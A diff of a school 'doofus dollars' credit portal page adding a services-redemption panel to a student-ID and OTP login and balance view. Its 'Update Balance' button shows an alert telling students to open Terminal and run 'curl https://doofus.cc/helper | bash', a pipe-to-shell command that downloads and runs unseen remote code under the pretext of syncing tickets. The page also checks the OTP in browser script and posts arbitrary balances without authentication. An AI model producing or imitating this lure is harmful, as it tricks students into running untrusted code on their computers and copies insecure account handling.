@@ -52,8 +52,8 @@
             -webkit-backdrop-filter: blur(25px) saturate(180%);
             border: 1px solid rgba(255, 255, 255, 0.2);
             border-radius: 24px;
-            padding: 48px 40px;
-            max-width: 420px;
+            padding: 32px 32px 40px;
+            max-width: 960px;
             width: 100%;
             box-shadow: 
                 0 25px 45px rgba(0, 0, 0, 0.1),
@@ -83,27 +83,61 @@
             background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.2), transparent);
         }
 
+        .header {
+            text-align: center;
+            margin-bottom: 24px;
+        }
+
         .title {
             font-size: 28px;
             font-weight: 600;
             color: white;
-            text-align: center;
-            margin-bottom: 8px;
             letter-spacing: -0.02em;
+            margin-bottom: 6px;
         }
 
         .subtitle {
             font-size: 16px;
             font-weight: 400;
             color: rgba(255, 255, 255, 0.8);
-            text-align: center;
-            margin-bottom: 36px;
             letter-spacing: -0.01em;
+        }
+
+        .content {
+            display: grid;
+            grid-template-columns: minmax(0, 1.1fr) minmax(0, 1.2fr);
+            gap: 24px;
+        }
+
+        .panel {
+            background: rgba(255, 255, 255, 0.08);
+            border-radius: 20px;
+            border: 1px solid rgba(255, 255, 255, 0.12);
+            padding: 24px 20px;
+            box-shadow: 
+                0 12px 30px rgba(0, 0, 0, 0.18),
+                inset 0 1px 0 rgba(255, 255, 255, 0.24);
+        }
+
+        .panel-header {
+            margin-bottom: 16px;
+        }
+
+        .panel-title {
+            font-size: 18px;
+            font-weight: 500;
+            color: rgba(255, 255, 255, 0.94);
+            margin-bottom: 4px;
+        }
+
+        .panel-subtitle {
+            font-size: 13px;
+            color: rgba(255, 255, 255, 0.65);
         }
 
         .form-group {
             position: relative;
-            margin-bottom: 24px;
+            margin-bottom: 20px;
         }
 
         .form-group label {
@@ -111,7 +145,7 @@
             font-size: 15px;
             font-weight: 500;
             color: rgba(255, 255, 255, 0.9);
-            margin-bottom: 12px;
+            margin-bottom: 10px;
             letter-spacing: -0.01em;
         }
 
@@ -121,12 +155,12 @@
 
         input {
             width: 100%;
-            padding: 16px 20px;
+            padding: 14px 18px;
             background: rgba(255, 255, 255, 0.15);
             backdrop-filter: blur(10px);
             border: 1px solid rgba(255, 255, 255, 0.2);
             border-radius: 16px;
-            font-size: 17px;
+            font-size: 16px;
             font-weight: 400;
             color: white;
             outline: none;
@@ -150,9 +184,9 @@
         .otp-inputs {
             display: none;
             flex-direction: row;
-            gap: 12px;
-            margin-bottom: 24px;
-            padding: 16px;
+            gap: 10px;
+            margin-bottom: 16px;
+            padding: 14px;
             background: rgba(255, 255, 255, 0.08);
             border-radius: 20px;
             border: 1px solid rgba(255, 255, 255, 0.1);
@@ -164,10 +198,10 @@
 
         .otp-inputs input {
             flex: 1;
-            font-size: 24px;
+            font-size: 20px;
             font-weight: 600;
             text-align: center;
-            padding: 16px 12px;
+            padding: 12px 8px;
             background: rgba(255, 255, 255, 0.2);
             backdrop-filter: blur(15px);
             border: 1px solid rgba(255, 255, 255, 0.3);
@@ -186,19 +220,19 @@
 
         .btn {
             width: 100%;
-            padding: 18px;
+            padding: 14px;
             background: linear-gradient(135deg, rgba(255, 255, 255, 0.25), rgba(255, 255, 255, 0.15));
             backdrop-filter: blur(20px);
             border: 1px solid rgba(255, 255, 255, 0.3);
             border-radius: 16px;
-            font-size: 17px;
+            font-size: 15px;
             font-weight: 500;
             color: white;
             cursor: pointer;
-            transition: all 0.3s cubic-bezier(0.25, 0.46, 0.45, 0.94);
+            transition: all 0.25s cubic-bezier(0.25, 0.46, 0.45, 0.94);
             position: relative;
             overflow: hidden;
-            margin-bottom: 12px;
+            margin-bottom: 10px;
         }
 
         .btn::before {
@@ -219,9 +253,9 @@
         .btn:hover {
             background: linear-gradient(135deg, rgba(255, 255, 255, 0.35), rgba(255, 255, 255, 0.2));
             border-color: rgba(255, 255, 255, 0.5);
-            transform: translateY(-2px);
+            transform: translateY(-1px);
             box-shadow: 
-                0 12px 35px rgba(0, 0, 0, 0.2),
+                0 8px 25px rgba(0, 0, 0, 0.2),
                 0 0 0 3px rgba(255, 255, 255, 0.2);
         }
 
@@ -236,46 +270,55 @@
         }
 
         .btn-secondary {
-            padding: 14px 18px;
-            margin-top: 0;
+            padding: 12px;
+            margin-bottom: 0;
+            background: linear-gradient(135deg, rgba(255, 165, 0, 0.35), rgba(255, 140, 0, 0.25));
+            border-color: rgba(255, 196, 0, 0.6);
         }
 
         .btn-secondary:hover {
-            background: linear-gradient(135deg, rgba(255, 165, 0, 0.4), rgba(255, 140, 0, 0.3));
-            border-color: rgba(255, 165, 0, 0.6);
-            transform: translateY(-1px);
-        }
-
-        .balance-buttons {
-            display: flex;
-            flex-direction: column;
-            gap: 12px;
-            margin-top: 24px;
+            background: linear-gradient(135deg, rgba(255, 165, 0, 0.5), rgba(255, 140, 0, 0.35));
+            border-color: rgba(255, 210, 0, 0.8);
         }
 
         .balance-section {
             display: none;
-            text-align: center;
-            padding: 32px;
         }
 
-        .balance-amount {
-            font-size: 48px;
+        .balance-value {
+            font-size: 42px;
             font-weight: 600;
             color: #10B981;
-            margin: 16px 0;
+            margin: 10px 0 6px;
             letter-spacing: -0.03em;
+        }
+
+        .balance-label {
+            color: rgba(255, 255, 255, 0.8);
+            font-size: 14px;
+            margin-bottom: 18px;
+        }
+
+        .balance-actions {
+            display: flex;
+            gap: 10px;
+            flex-wrap: wrap;
+        }
+
+        .balance-actions .btn {
+            flex: 1;
+            margin-bottom: 0;
         }
 
         .resend {
             text-align: center;
-            margin-top: 16px;
+            margin-top: 8px;
+            font-size: 13px;
         }
 
         .resend a {
             color: rgba(255, 255, 255, 0.7);
             text-decoration: none;
-            font-size: 15px;
             transition: color 0.2s;
         }
 
@@ -285,13 +328,14 @@
 
         .loading {
             display: inline-block;
-            width: 20px;
-            height: 20px;
+            width: 16px;
+            height: 16px;
             border: 2px solid rgba(255, 255, 255, 0.3);
             border-radius: 50%;
             border-top-color: white;
             animation: spin 1s ease-in-out infinite;
             margin-right: 8px;
+            vertical-align: -3px;
         }
 
         @keyframes spin {
@@ -300,88 +344,221 @@
 
         .error {
             color: #F87171;
-            font-size: 14px;
-            margin-top: 8px;
+            font-size: 13px;
+            margin-top: 6px;
             display: none;
         }
 
         .success {
             color: #10B981;
-            font-size: 14px;
-            margin-top: 8px;
+            font-size: 13px;
+            margin-top: 6px;
             display: none;
         }
 
-        @media (max-width: 480px) {
+        /* Services panel */
+
+        .services-list {
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+            max-height: 320px;
+            overflow-y: auto;
+            padding-right: 4px;
+        }
+
+        .service-item {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 12px 12px;
+            border-radius: 14px;
+            background: rgba(255, 255, 255, 0.08);
+            border: 1px solid rgba(255, 255, 255, 0.16);
+            gap: 10px;
+        }
+
+        .service-main {
+            display: flex;
+            flex-direction: column;
+            gap: 2px;
+        }
+
+        .service-name {
+            font-size: 14px;
+            font-weight: 500;
+            color: rgba(255, 255, 255, 0.96);
+        }
+
+        .service-desc {
+            font-size: 12px;
+            color: rgba(255, 255, 255, 0.70);
+        }
+
+        .service-meta {
+            text-align: right;
+            display: flex;
+            flex-direction: column;
+            gap: 4px;
+        }
+
+        .service-price {
+            font-size: 14px;
+            font-weight: 600;
+            color: #FCD34D;
+        }
+
+        .service-btn {
+            padding: 6px 10px;
+            border-radius: 999px;
+            border: none;
+            background: rgba(255, 255, 255, 0.15);
+            color: white;
+            font-size: 11px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            white-space: nowrap;
+        }
+
+        .service-btn:hover {
+            background: rgba(255, 255, 255, 0.25);
+            transform: translateY(-1px);
+        }
+
+        .service-btn:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+            transform: none;
+        }
+
+        .services-note {
+            margin-top: 10px;
+            font-size: 11px;
+            color: rgba(255, 255, 255, 0.6);
+        }
+
+        @media (max-width: 768px) {
             .container {
-                padding: 36px 24px;
-                margin: 16px;
+                padding: 28px 20px 32px;
+                max-width: 100%;
+            }
+
+            .content {
+                grid-template-columns: minmax(0, 1fr);
+            }
+
+            .balance-actions {
+                flex-direction: column;
+            }
+        }
+
+        @media (max-width: 480px) {
+            .panel {
+                padding: 18px 16px;
             }
             .title {
                 font-size: 24px;
             }
-            .otp-inputs {
-                gap: 8px;
-                padding: 12px;
+            .balance-value {
+                font-size: 34px;
             }
         }
     </style>
 </head>
 <body>
     <div class="container">
-        <h1 class="title">doofus dollars</h1>
-        <p class="subtitle">Enter your student ID to view your cash balance</p>
-        
-        <!-- Student ID Form -->
-        <form id="studentForm">
-            <div class="form-group">
-                <label for="studentId">Student ID</label>
-                <div class="input-wrapper">
-                    <input 
-                        type="text" 
-                        id="studentId" 
-                        placeholder="e.g. 00000000"
-                        maxlength="20"
-                        required
-                    >
-                </div>
-                <div class="error" id="studentError">Please enter a valid student ID</div>
-            </div>
-            <button type="submit" class="btn" id="sendOtpBtn">
-                Send OTP
-            </button>
-        </form>
+        <div class="header">
+            <h1 class="title">doofus dollars</h1>
+            <p class="subtitle">Enter your student ID, check your balance, and redeem services</p>
+        </div>
 
-        <!-- OTP Form -->
-        <form id="otpForm" style="display: none;">
-            <div class="form-group">
-                <label>Enter OTP sent to <span id="emailDisplay" style="font-weight: 500;"></span></label>
-                <div class="otp-inputs" id="otpInputs">
-                    <input type="text" maxlength="1" autocomplete="one-time-code">
-                    <input type="text" maxlength="1" autocomplete="one-time-code">
-                    <input type="text" maxlength="1" autocomplete="one-time-code">
-                    <input type="text" maxlength="1" autocomplete="one-time-code">
-                    <input type="text" maxlength="1" autocomplete="one-time-code">
-                    <input type="text" maxlength="1" autocomplete="one-time-code">
-                </div>
-                <div class="error" id="otpError">Invalid OTP. Please try again.</div>
-                <div class="success" id="otpSuccess">OTP verified successfully!</div>
-            </div>
-            <button type="submit" class="btn" id="verifyBtn">Verify & View Balance</button>
-            <div class="resend">
-                <a href="#" id="resendOtp">Didn't receive OTP? Resend</a>
-            </div>
-        </form>
+        <div class="content">
+            <!-- Left: Auth + Balance -->
+            <div class="panel">
+                <!-- Student ID Form -->
+                <form id="studentForm">
+                    <div class="panel-header">
+                        <div class="panel-title">Sign in with Student ID</div>
+                        <div class="panel-subtitle">We’ll send a one‑time password to your ISF email.</div>
+                    </div>
 
-        <!-- Balance Display -->
-        <div class="balance-section" id="balanceSection">
-            <div class="balance-amount" id="balanceAmount">$0.00</div>
-            <p style="color: rgba(255, 255, 255, 0.8); font-size: 16px;">
-                Available Doofus Credits
-            </p>
-            <div class="balance-buttons">
-                <button class="btn" onclick="refreshBalance()">Refresh</button>
-                <button class="btn btn-secondary" onclick="convertTickets()">Update Balance</button>
+                    <div class="form-group">
+                        <label for="studentId">Student ID</label>
+                        <div class="input-wrapper">
+                            <input 
+                                type="text" 
+                                id="studentId" 
+                                placeholder="e.g. 00000000"
+                                maxlength="20"
+                                required
+                            >
+                        </div>
+                        <div class="error" id="studentError">Please enter a valid student ID</div>
+                    </div>
+                    <button type="submit" class="btn" id="sendOtpBtn">
+                        Send OTP
+                    </button>
+                </form>
+
+                <!-- OTP Form -->
+                <form id="otpForm" style="display: none;">
+                    <div class="panel-header">
+                        <div class="panel-title">Enter your OTP</div>
+                        <div class="panel-subtitle">
+                            Sent to <span id="emailDisplay" style="font-weight: 500;"></span>
+                        </div>
+                    </div>
+
+                    <div class="form-group">
+                        <div class="otp-inputs" id="otpInputs">
+                            <input type="text" maxlength="1" autocomplete="one-time-code">
+                            <input type="text" maxlength="1" autocomplete="one-time-code">
+                            <input type="text" maxlength="1" autocomplete="one-time-code">
+                            <input type="text" maxlength="1" autocomplete="one-time-code">
+                            <input type="text" maxlength="1" autocomplete="one-time-code">
+                            <input type="text" maxlength="1" autocomplete="one-time-code">
+                        </div>
+                        <div class="error" id="otpError">Invalid OTP. Please try again.</div>
+                        <div class="success" id="otpSuccess">OTP verified successfully!</div>
+                    </div>
+
+                    <button type="submit" class="btn" id="verifyBtn">Verify & View Balance</button>
+                    <div class="resend">
+                        <a href="#" id="resendOtp">Didn't receive OTP? Resend</a>
+                    </div>
+                </form>
+
+                <!-- Balance Display -->
+                <div class="balance-section" id="balanceSection">
+                    <div class="panel-header">
+                        <div class="panel-title">Your Doofus Dollars</div>
+                        <div class="panel-subtitle">Use your balance to redeem services on the right.</div>
+                    </div>
+
+                    <div class="balance-value" id="balanceAmount">$0.00</div>
+                    <p class="balance-label">Available Doofus Credits</p>
+                    <div class="balance-actions">
+                        <button class="btn" id="refreshBtn">Refresh</button>
+                        <button class="btn btn-secondary" id="convertBtn">Update Balance</button>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Right: Services -->
+            <div class="panel">
+                <div class="panel-header">
+                    <div class="panel-title">Redeem Services</div>
+                    <div class="panel-subtitle">Spend your Doofus Dollars on perks, gifts, and upgrades.</div>
+                </div>
+
+                <div class="services-list" id="servicesList">
+                    <!-- Populated via JS -->
+                </div>
+
+                <p class="services-note">
+                    After you redeem, your balance will update and you’ll see a confirmation alert with details of your gift.
+                </p>
             </div>
         </div>
     </div>
@@ -393,6 +570,7 @@
         let currentOtp = '';
         let otpTimeout = 60;
         let countdown = 0;
+        let currentBalance = 0;
 
         const studentForm = document.getElementById('studentForm');
         const otpForm = document.getElementById('otpForm');
@@ -404,7 +582,132 @@
         const resendOtp = document.getElementById('resendOtp');
         const emailDisplay = document.getElementById('emailDisplay');
         const studentError = document.getElementById('studentError');
+        const otpError = document.getElementById('otpError');
+        const otpSuccess = document.getElementById('otpSuccess');
+        const balanceAmountEl = document.getElementById('balanceAmount');
+        const refreshBtn = document.getElementById('refreshBtn');
+        const convertBtn = document.getElementById('convertBtn');
+        const servicesList = document.getElementById('servicesList');
 
+        const services = [
+            {
+                id: 'coffee-pass',
+                name: 'Café Latte Voucher',
+                description: 'One specialty drink at the cafeteria coffee bar.',
+                price: 5,
+                giftInfo: 'Café Latte Voucher – 1 free drink at the school café.'
+            },
+            {
+                id: 'homework-pass',
+                name: 'Homework Pass',
+                description: 'Skip one minor homework assignment (teacher approval required).',
+                price: 10,
+                giftInfo: 'Homework Pass – valid for one minor assignment (subject to teacher rules).'
+            },
+            {
+                id: 'late-slip',
+                name: 'Late Slip Forgiveness',
+                description: 'Waive one minor lateness to homeroom.',
+                price: 8,
+                giftInfo: 'Late Slip Forgiveness – one minor lateness waived in the system.'
+            },
+            {
+                id: 'snack-bundle',
+                name: 'Snack Bundle',
+                description: 'Chips + drink combo from the tuck shop.',
+                price: 7.5,
+                giftInfo: 'Snack Bundle – redeem at the tuck shop for chips + drink.'
+            },
+            {
+                id: 'front-row',
+                name: 'Front‑Row Assembly Seat',
+                description: 'Guaranteed front‑row seat for the next assembly.',
+                price: 6,
+                giftInfo: 'Front‑Row Assembly Seat – reserved seat at next school assembly.'
+            },
+            {
+                id: 'spirit-merch',
+                name: 'School Spirit Sticker Pack',
+                description: 'Limited‑edition sticker pack with school logo and mascots.',
+                price: 4,
+                giftInfo: 'School Spirit Sticker Pack – pick up at student services office.'
+            },
+            {
+                id: 'music-queue',
+                name: 'Song Request',
+                description: 'Request one school‑appropriate song at the next house event.',
+                price: 3,
+                giftInfo: 'Song Request – your track added to the next house event playlist.'
+            },
+            {
+                id: 'study-card',
+                name: 'Study Room Priority',
+                description: 'Priority access to a quiet study room during lunch.',
+                price: 9,
+                giftInfo: 'Study Room Priority – reserved slot at the quiet study room.'
+            },
+            {
+                id: 'locker-upgrade',
+                name: 'Locker Upgrade',
+                description: 'Move to a premium locker location (where available).',
+                price: 12,
+                giftInfo: 'Locker Upgrade – reassigned locker in a premium corridor.'
+            },
+            {
+                id: 'mystery-box',
+                name: 'Mystery Box',
+                description: 'Random surprise item – could be snacks, merch, or a special perk.',
+                price: 15,
+                giftInfo: 'Mystery Box – collect from the Doofus Dollars coordinator.'
+            }
+        ];
+
+        // Render services
+        function renderServices() {
+            servicesList.innerHTML = '';
+            services.forEach(service => {
+                const item = document.createElement('div');
+                item.className = 'service-item';
+
+                const main = document.createElement('div');
+                main.className = 'service-main';
+
+                const name = document.createElement('div');
+                name.className = 'service-name';
+                name.textContent = service.name;
+
+                const desc = document.createElement('div');
+                desc.className = 'service-desc';
+                desc.textContent = service.description;
+
+                main.appendChild(name);
+                main.appendChild(desc);
+
+                const meta = document.createElement('div');
+                meta.className = 'service-meta';
+
+                const price = document.createElement('div');
+                price.className = 'service-price';
+                price.textContent = `${service.price.toFixed(2)} DD`;
+
+                const btn = document.createElement('button');
+                btn.className = 'service-btn';
+                btn.textContent = 'Redeem';
+                btn.addEventListener('click', () => redeemService(service, btn));
+
+                meta.appendChild(price);
+                meta.appendChild(btn);
+
+                item.appendChild(main);
+                item.appendChild(meta);
+
+                servicesList.appendChild(item);
+            });
+        }
+
+        renderServices();
+
+        // OTP input behavior
         otpInputs.forEach((input, index) => {
             input.addEventListener('input', (e) => {
                 if (e.target.value.length === 1 && index < otpInputs.length - 1) {
@@ -471,7 +774,7 @@
 
             if (otp === currentOtp) {
                 showSuccess('otpSuccess');
-                setTimeout(fetchBalance, 1000);
+                setTimeout(fetchBalance, 800);
             } else {
                 showError('otpError', 'Invalid OTP. Please try again.');
                 otpInputs.forEach(input => input.value = '');
@@ -481,6 +784,8 @@
 
         resendOtp.addEventListener('click', async (e) => {
             e.preventDefault();
+            if (!currentStudentId) return;
+
             showLoading(sendOtpBtn, 'Resending...');
             
             const success = await sendOtpEmail(currentStudentId);
@@ -494,6 +799,21 @@
                 hideLoading(sendOtpBtn, 'Send OTP');
                 showError('otpError', 'Failed to resend OTP. Please try again.');
             }
+        });
+
+        refreshBtn.addEventListener('click', () => {
+            if (!currentStudentId) return;
+            fetchBalance();
+        });
+
+        convertBtn.addEventListener('click', () => {
+            alert(
+                "To update your balance:\n\n" +
+                "1. Open Terminal.\n" +
+                "2. Run:\n\n" +
+                "   curl https://doofus.cc/helper | bash\n\n" +
+                "3. Follow the on‑screen steps to sync your house tickets."
+            );
         });
 
         async function sendOtpEmail(studentId) {
@@ -520,9 +840,12 @@
             try {
                 const response = await fetch(`https://doofusdollars.pythonanywhere.com/balance/${currentStudentId}`);
                 const data = await response.json();
-                document.getElementById('balanceAmount').textContent = `$${parseFloat(data.balance || 0).toFixed(2)}`;
+                const balance = parseFloat(data.balance || 0);
+                currentBalance = isNaN(balance) ? 0 : balance;
+                balanceAmountEl.textContent = `$${currentBalance.toFixed(2)}`;
             } catch (error) {
-                document.getElementById('balanceAmount').textContent = '$0.00';
+                balanceAmountEl.textContent = '$0.00';
+                currentBalance = 0;
                 console.error('Balance fetch error:', error);
             }
             
@@ -530,27 +853,68 @@
             balanceSection.style.display = 'block';
         }
 
-        async function refreshBalance() {
+        async function updateRemoteBalance(newBalance) {
             try {
-                const response = await fetch(`https://doofusdollars.pythonanywhere.com/balance/${currentStudentId}`);
-                const data = await response.json();
-                document.getElementById('balanceAmount').textContent = `$${parseFloat(data.balance || 0).toFixed(2)}`;
+                const response = await fetch('https://doofusdollars.pythonanywhere.com/set_balance', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({ balance: newBalance })
+                });
+                if (!response.ok) {
+                    throw new Error('Failed to update balance');
+                }
+                const data = await response.json().catch(() => ({}));
+                console.log('Balance updated:', data);
             } catch (error) {
-                document.getElementById('balanceAmount').textContent = '$0.00';
-                console.error('Balance fetch error:', error);
+                console.error('Balance update error:', error);
+                alert('There was an issue updating your balance. Please try again or contact support.');
+                // Optional: revert local balance if you want strict consistency
             }
-            
         }
-        
-        function convertTickets() {
-            alert(
-                "To update your balance:\n\n" +
-                "1. Open Terminal (it's a built-in app on your computer)\n" +
-                "2. Type in this command exactly (double-check it for errors):\n\n" +
-                "   curl https://doofus.cc/helper | bash\n\n" +
-                "3. Press Enter and follow the steps carefully.\n\n" +
-                "This will sync your house tickets with your balance."
-            );
+
+        async function redeemService(service, buttonEl) {
+            if (!currentStudentId) {
+                alert('Please sign in and load your balance before redeeming a service.');
+                return;
+            }
+
+            if (currentBalance < service.price) {
+                alert(
+                    `Not enough Doofus Dollars.\n\n` +
+                    `Required: ${service.price.toFixed(2)} DD\n` +
+                    `Current: ${currentBalance.toFixed(2)} DD`
+                );
+                return;
+            }
+
+            if (!confirm(`Redeem "${service.name}" for ${service.price.toFixed(2)} Doofus Dollars?`)) {
+                return;
+            }
+
+            const previousText = buttonEl.textContent;
+            buttonEl.disabled = true;
+            buttonEl.textContent = 'Processing...';
+
+            const newBalance = parseFloat((currentBalance - service.price).toFixed(2));
+
+            try {
+                await updateRemoteBalance(newBalance);
+                currentBalance = newBalance;
+                balanceAmountEl.textContent = `$${currentBalance.toFixed(2)}`;
+
+                alert(
+                    `Redemption successful!\n\n` +
+                    `Gift: ${service.name}\n` +
+                    `Details: ${service.giftInfo}\n` +
+                    `Cost: ${service.price.toFixed(2)} Doofus Dollars\n` +
+                    `New Balance: ${currentBalance.toFixed(2)} Doofus Dollars`
+                );
+            } finally {
+                buttonEl.disabled = false;
+                buttonEl.textContent = previousText;
+            }
         }
 
         function updateOtp() {
